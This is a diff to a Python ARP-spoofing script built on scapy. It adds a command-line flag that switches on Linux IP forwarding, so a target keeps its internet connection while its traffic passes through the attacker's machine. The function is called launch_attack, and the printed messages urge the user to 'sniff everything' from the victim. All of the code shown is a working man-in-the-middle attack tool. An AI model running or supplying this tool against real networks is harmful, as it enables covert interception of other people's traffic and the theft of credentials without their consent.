@@ -5,11 +5,21 @@ import time
 import argparse
 import sys
 from termcolor import colored
+import os
+
+def enable_ipforward(ip_forward):
+    if ip_forward == "True":
+        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+        print(colored("\r[+] IP Forwarding is Enabled. Remember to Sniff Everything on your current Interface :)", "green"))
+    elif ip_forward == "False":
+        print(colored("[-] IP Forwarding is not Enabled. The Target will have no Internet Connection.", "yellow"))
+        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
 
 def get_arguements():
     parser = argparse.ArgumentParser()
     parser.add_argument("-t","--target", dest="target_ip", help="Press -h to display Help.")
     parser.add_argument("-g","--gateway", dest="spoof_ip", help="Press -h to display Help.")
+    parser.add_argument("-f","--forward", dest="ip_forward", help="Press -h to display Help")
     options = parser.parse_args()
     return options
 
@@ -36,7 +46,8 @@ def restore(target_ip, source_ip): # The source IP is the Mac Address of the Rou
     scapy.send(packet, count=4, verbose=False)
 
 
-def launch_attack(target_ip, spoof_ip):
+def launch_attack(target_ip, spoof_ip, ip_forward):
+    enable_ipforward(ip_forward)
     try:
         counter = 0
         while True:
@@ -53,6 +64,7 @@ def launch_attack(target_ip, spoof_ip):
         print(colored("[*] Hope you Sniffed em all.", "green"))
 
 options = get_arguements()
+ip_forward = options.ip_forward
 target_ip = options.target_ip
 spoof_ip  = options.spoof_ip
-launch_attack(target_ip, spoof_ip)
+launch_attack(target_ip, spoof_ip, ip_forward)
